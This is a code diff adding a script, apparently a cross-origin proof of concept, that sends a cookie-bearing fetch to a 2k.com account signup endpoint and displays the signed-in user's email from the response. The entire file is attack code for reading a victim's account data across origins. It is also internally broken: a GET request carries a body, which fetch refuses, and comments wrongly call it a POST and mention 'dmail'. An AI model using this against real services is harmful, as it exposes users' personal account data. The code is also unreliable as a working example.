@@ -1,0 +1,32 @@
+<script>
+// Define the URL and JSON data
+const url = "https://accounts.2k.com/v2/signup";
+const data = {};
+
+// Create a Fetch Request
+const request = new Request(url, {
+  method: 'GET',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  credentials: 'include', // Include browser cookies
+  body: JSON.stringify(data), // Convert the data object to JSON
+});
+
+// Perform the POST request
+fetch(request)
+  .then(response => response.json())
+  .then(data => {
+    // Extract the email values from the response
+    const email = data.email;
+
+    // Print the values in the console
+    console.log("Email:", email);
+
+    // Show a popup with the email and dmail values
+    alert("Email: " + email);
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+</script>
